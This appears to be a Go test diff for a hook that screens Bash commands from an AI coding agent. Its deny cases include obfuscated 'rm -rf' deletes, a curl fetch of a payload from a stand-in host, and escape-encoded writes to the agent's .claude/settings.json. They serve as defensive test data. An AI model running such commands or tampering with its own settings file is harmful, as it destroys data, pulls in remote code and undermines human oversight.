@@ -908,6 +908,7 @@ func TestHookPreToolStillAllowsBenignBashAfterASTClassifier(t *testing.T) {
 		"git status --short",
 		"go build ./... && go vet ./...",
 		"git log --oneline | head -5",
+		`echo "today is $(date +%F)"`,
 		"npm run build",
 		"python --version",
 		`bash scripts/deploy.sh "$ARG"`,
@@ -1500,7 +1501,10 @@ func TestHookPreToolFailsClosedOnShellExpansion(t *testing.T) {
 		`echo '{}' > $'.claude/settings.js\x6fn'`,
 		`cp evil.json $'.claude/settings.js\x6fn'`,
 		"$CMD -rf /home/u/project",
-		"echo $(date)",
+		"$(echo rm) -rf /x",
+		`rm -rf "$(cat target)"`,
+		"x=$(curl https://example.test/payload)",
+		"echo $(whoami)",
 		"echo '{}' > .claude/./settings.json",
 		"cd .claude && echo '{}' > settings.json",
 	}
@@ -1621,5 +1625,30 @@ func TestHookPreToolDeniesPersistenceWrites(t *testing.T) {
 		"tool_input": map[string]any{"notebook_path": "/home/u/project/analysis.ipynb"},
 	}) {
 		t.Fatal("ordinary notebook edit was denied")
+	}
+}
+
+// TestHookPreToolTreatsReadOnlySubstitutionLikeItsLiteral keeps the standard
+// Claude Code commit pattern usable: a heredoc captured by $(cat <<'EOF') gets
+// the same outcome as the literal message, and so does "$(date)".
+func TestHookPreToolTreatsReadOnlySubstitutionLikeItsLiteral(t *testing.T) {
+	tmp := t.TempDir()
+	restoreHookClock(t)
+	for _, command := range []string{
+		`git commit -m "msg"`,
+		"git commit -m \"$(cat <<'EOF'\nfix: handle {a,b}\n\nCo-Authored-By: A <a@example.test>\nEOF\n)\"",
+		`echo "$(date)"`,
+	} {
+		payload := map[string]any{
+			"tool_name":  "Bash",
+			"tool_input": map[string]any{"command": command},
+			"session_id": "commit",
+		}
+		if runHookPreToolForTest(t, tmp, payload) {
+			t.Fatalf("command %q was denied", command)
+		}
+	}
+	if receipts := globReceipts(t, tmp); len(receipts) != 0 {
+		t.Fatalf("read-only substitutions wrote receipts: %v", receipts)
 	}
 }
